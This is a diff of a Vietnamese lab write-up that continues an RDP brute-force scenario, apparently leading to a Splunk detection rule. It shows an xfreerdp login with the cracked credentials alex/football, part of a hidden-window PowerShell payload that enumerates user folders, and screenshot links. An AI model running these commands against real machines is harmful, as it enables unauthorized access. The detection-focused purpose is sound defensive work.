@@ -11,7 +11,11 @@ Tiếp nối với kịch bản Brute Force RDP. Thì hiện tại attacker có 
 xfreerdp /u:alex /p:football /v:192.168.188.40:3389
 ```
 
-(Dưới đây là đoạn payload mà tôi đã chuẩn bị sẳng)
+<img width="1591" height="908" alt="image" src="https://github.com/user-attachments/assets/a36e1eb6-cf42-417f-86f1-d4717a5430c9" />
+
+Và nhưu hình dưới ta đã vào được máy của user alex
+
+(Dưới đây là đoạn payload mà tôi đã chuẩn bị sẳn)
 
 ```
 powershell -nop -w hidden -c "
@@ -29,6 +33,8 @@ Start-Process powershell -ArgumentList '-nop -w hidden';
 Get-ChildItem C:\Users;
 "
 ```
+
+<img width="1388" height="828" alt="image" src="https://github.com/user-attachments/assets/cbc2a3ed-7404-4398-8d68-21275923971c" />
 
 ## 2. Detection Rule (SPL)
 
